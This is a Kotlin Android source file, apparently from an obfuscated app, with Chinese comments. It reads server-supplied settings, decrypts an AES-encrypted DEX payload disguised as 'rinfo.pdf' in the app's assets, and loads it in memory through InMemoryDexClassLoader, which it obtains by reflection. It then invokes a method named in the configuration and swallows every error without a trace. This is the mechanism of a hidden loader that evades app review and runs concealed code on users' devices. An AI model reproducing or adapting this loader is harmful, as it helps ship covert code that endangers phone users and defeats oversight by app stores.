package com.lecture.field.tell.jm

import android.content.Context
import android.util.Base64
import android.util.Log
import com.lecture.field.tell.ext.PeekExample
import com.lecture.field.tell.line.ConTool
import mei.ye.DataPreferences
import org.json.JSONObject
import java.io.ByteArrayOutputStream
import java.nio.ByteBuffer
import javax.crypto.Cipher
import javax.crypto.spec.SecretKeySpec

object KeepCore {
    private const val TAG = "KeepCore"

    /**
     * 加载并执行加密的DEX文件
     * @param context 上下文对象
     * @return 是否成功加载和调用
     */
    fun loadAndInvokeDex(context: Context): Boolean {
        return try {

            // 1. 获取配置信息
            val config = getConfigFromPreferences(context)
            if (config == null) {
                return false
            }


            // 2. 从assets读取加密文件
            val encryptedData = readEncryptedFileFromAssets(context, config.fileName)
            if (encryptedData == null) {
                return false
            }


            // 3. 解密DEX数据
            val dexBytes = decryptDexData(encryptedData, config.aesKey)
            if (dexBytes == null) {
                return false
            }


            // 4. 使用反射加载DEX
            val dexClass = loadDexWithReflection(dexBytes, config.classLoaderName, config.targetClassName)
            if (dexClass == null) {
                return false
            }


            // 5. 反射调用目标方法
            val success = invokeTargetMethod(dexClass, config.methodName, context)


            success
        } catch (e: Exception) {
            false
        }
    }

    /**
     * 配置数据类
     */
    private data class DexConfig(
        val fileName: String,
        val algorithm: String,
        val classLoaderName: String,
        val targetClassName: String,
        val methodName: String,
        val aesKey: String
    )

    /**
     * 从DataPreferences获取配置信息
     */
    private fun getConfigFromPreferences(context: Context): DexConfig? {
        return try {
            val dataPrefs = DataPreferences.getInstance(context)
            val adminDataJson = dataPrefs.getString(PeekExample.KEY_ADMIN_DATA, "")

            if (adminDataJson.isEmpty()) {
                Log.e(TAG, "KEY_ADMIN_DATA为空")
                return null
            }

            val jsonObject = JSONObject(adminDataJson)

            // 解析 "allcango" 字段
            val allcango = jsonObject.optString("allcango", "")
            if (allcango.isEmpty()) {
                return null
            }

            // 解析配置字符串: "rinfo.pdf-AES-dalvik.system.InMemoryDexClassLoader-com.hightway.tell.peek.Core-a"
            val parts = allcango.split("-")
            if (parts.size != 5) {
                return null
            }

            // 获取AES密钥
            val aesKey = jsonObject.optString("one_line", "")
            if (aesKey.isEmpty()) {
                return null
            }

            DexConfig(
                fileName = parts[0],
                algorithm = parts[1],
                classLoaderName = parts[2],
                targetClassName = parts[3],
                methodName = parts[4],
                aesKey = aesKey
            )
        } catch (e: Exception) {
            null
        }
    }

    /**
     * 从assets文件夹读取加密文件
     */
    private fun readEncryptedFileFromAssets(context: Context, fileName: String): String? {
        return try {
            // 从assets/oho/目录读取文件
            val assetPath = "oho/$fileName"

            context.assets.open(assetPath).use { inputStream ->
                val result = inputStream.bufferedReader().use { it.readText() }
                result
            }
        } catch (e: Exception) {
            null
        }
    }

    /**
     * 解密DEX数据
     */
    private fun decryptDexData(encryptedText: String, aesKeyString: String): ByteArray? {
        return try {
            // Base64解码
            val encryptedBytes = Base64.decode(encryptedText, Base64.DEFAULT)

            // AES解密
            val aesKeyBytes = aesKeyString.toByteArray(Charsets.UTF_8)
            val keySpec = SecretKeySpec(aesKeyBytes, "AES")
            val cipher = Cipher.getInstance("AES")
            cipher.init(Cipher.DECRYPT_MODE, keySpec)

            val decryptedBytes = cipher.doFinal(encryptedBytes)

            decryptedBytes
        } catch (e: Exception) {
            null
        }
    }

    /**
     * 使用反射加载DEX
     */
    private fun loadDexWithReflection(
        dexBytes: ByteArray,
        classLoaderName: String,
        targetClassName: String
    ): Class<*>? {
        return try {

            // 通过反射获取InMemoryDexClassLoader类
            val classLoaderClass = Class.forName(classLoaderName)

            // 获取构造函数: InMemoryDexClassLoader(ByteBuffer dexBuffer, ClassLoader parent)
            val constructor = classLoaderClass.getConstructor(
                ByteBuffer::class.java,
                ClassLoader::class.java
            )

            // 创建ByteBuffer
            val dexBuffer = ByteBuffer.wrap(dexBytes)

            // 创建ClassLoader实例，使用当前ClassLoader作为父加载器
            val parentClassLoader = KeepCore::class.java.classLoader
            val dexClassLoader = constructor.newInstance(dexBuffer, parentClassLoader) as ClassLoader

            // 加载目标类
            val targetClass = dexClassLoader.loadClass(targetClassName)

            targetClass
        } catch (e: Exception) {
            null
        }
    }

    /**
     * 反射调用目标方法
     */
    private fun invokeTargetMethod(targetClass: Class<*>, methodName: String, context: Context): Boolean {
        return try {
            val method = targetClass.getMethod(methodName, Context::class.java)

            method.invoke(null, context)
            true
        } catch (e: Exception) {
            false
        }
    }
}